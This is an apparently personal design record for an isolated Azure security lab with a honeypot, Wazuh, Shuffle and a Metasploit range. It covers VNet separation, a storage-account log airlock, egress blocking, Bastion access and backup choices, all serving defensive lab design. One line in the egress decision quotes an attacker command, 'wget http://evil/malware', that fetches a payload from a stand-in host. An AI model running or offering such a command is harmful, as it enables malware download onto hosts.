Two VNets, No Bridge

The Azure network layer beneath the Wazuh manager, the Metasploit lab, Shuffle, and the network-packets.com honeypot — designed on paper before a single resource was provisioned, because address space and trust boundaries are far cheaper to settle in a document than to unpick in a running lab.

There is no line between the two VNets. The honeypot's data reaches Wazuh by writing into a storage account that Wazuh separately reads from. Neither VNet can route to the other, and neither holds a credential that works in the other.

The single most important property

§3

Topology — logical

How traffic is permitted to move: address spaces, trust zones, and the direction each flow is allowed to be initiated in. This is the layer you actually control.

§3b

Topology — physical

Where the actual machines are, and who owns the ones you don't. In IaaS this diverges sharply from the logical view — most of the physical layer is not yours to draw.

Where the diagram stops

You cannot draw a true physical topology for the middle column. Which rack, which host, which top-of-rack switch, which fibre path — none of it is exposed, and your VM may be live-migrated to different hardware without notice. Region is the smallest physical unit you actually control. That is the shared-responsibility boundary made visible: Microsoft owns physical and infrastructure security, you own everything from the virtual network upward.

Why the two views disagree

The first row is the one that matters. Logical separation is the entire control — R-02 is enforced by the absence of a route, not by distance. Two machines can sit inches apart and still have no path between them, which is exactly the situation here.

D-01

The airlock, and the conflict it resolves

Two Phase 1 commitments pointed in opposite directions. Reconciling them produced the defining feature of this architecture.

The business continuity plan required honeypot data to be forwarded continuously to a store outside the honeypot VNet. Risk R-02 and Policy §6 required that no routine credential, account, or trust relationship be shared between the honeypot VNet and the private lab. Continuous forwarding from honeypot to Wazuh is a path between the two VNets.

The resolution was hiding in the BCP's own parenthetical, which contained both the problem and the answer: "the Wazuh manager, or a separate storage account."

§5

The four decisions

All accepted 20 August 2026. Reasoning is retained rather than trimmed — a decision record that keeps only the outcome cannot be re-examined when the constraints that produced it change.

D-01

Storage-account airlock

Accepted

The honeypot appends to blob storage using a short-lived, auto-rotated SAS scoped to append and create on one container. Wazuh pulls from the lab side on a schedule, under a separate identity. Public network access on the storage account is disabled; the honeypot reaches it over a service endpoint, so log traffic never crosses the public internet.

Why it holdsThe lab initiates; the honeypot side never does. Direction of initiation is the control, not the firewall rule.
D-02a

Honeypot egress — default deny

Accepted

A gap in the Phase 1 documents: the risk register covered the honeypot being attacked and the honeypot pivoting inward, but nothing covered the honeypot being used to attack someone else. Azure permits all outbound by default, so not deciding this was deciding it. Now tracked as R-13.

The tradeoff, stated plainlyBlocking egress costs realism — an attacker who runs wget http://evil/malware gets a failure, which can tip them off. Taken anyway: the attempted URL is the intelligence. The capture is the product; the payload is not.
D-02b

Lab egress — R-03 becomes technical

Accepted

R-03 rates "offensive tooling reaches a real third-party host" at High, and its only control was a signed rules-of-engagement document — an administrative control against what is fundamentally an operator-error risk. A typo'd CIDR in an msfconsole target range is not prevented by a signature.

What changesA mistyped target range now fails closed instead of reaching the internet. The control converts from administrative to technical — a material reduction in likelihood.
D-03

Bastion Developer SKU

Accepted — free

No VM in either VNet gets a public IP for administration, which removes an entire class of exposure rather than restricting it by source IP. Bastion Basic would cost roughly $139/month billed from deployment until deletion; Standard roughly $212.

The elegant partDeveloper SKU's headline limitation — "does not support virtual network peering" — is the thing that disqualifies it almost everywhere else. Here R-02 forbids peering anyway, so the limitation costs exactly nothing. Its other limit, one VM connection at a time, is irrelevant to a solo operator.
D-04

The honeypot is deliberately not backed up

Accepted

A honeypot is a machine you expect to be compromised. A daily snapshot of it is a daily snapshot of an attacker's foothold, and restoring one restores the compromise. Wazuh and Shuffle get daily backup with 7-day retention because they hold genuinely irreplaceable state — detection history, tuned rules, playbooks. The Metasploit lab gets a golden image and no daily backup, because a backup would contradict its own impact-analysis entry.

Why its RPO reads "continuous"The honeypot's data is protected by D-01's continuous forwarding, not by snapshots — which is precisely why its recovery-point objective is continuous while its recovery-time objective is the most relaxed of any system here.

§7

Read as control types

The same architecture, classified the way an exam scenario or an auditor would classify it. Every control here has both a type and a category.

Control classification
ControlTypeNote
No peering (R-02), default-deny egress, no public management planePreventive · technicalStops the event occurring at all.
Honeypot, Wazuh rulesDetective · technicalNo legitimate user ever touches a honeypot, so any interaction is unauthorised by definition — the lowest false-positive signal available.
Shuffle blocking a source addressCorrectiveActs after detection, not before the event.
Golden-image rebuild, Azure BackupRecoveryRestores operation after damage.
Information Security Policy, rules of engagementDirective · administrativeMandates behaviour. D-02b exists precisely because a directive control was carrying a technical risk.

One deliberate omission worth noting: the honeypot is the single asset here that gets no deterrent control. Warning banners are standard practice everywhere else — on a decoy, deterring the attacker defeats the entire purpose.
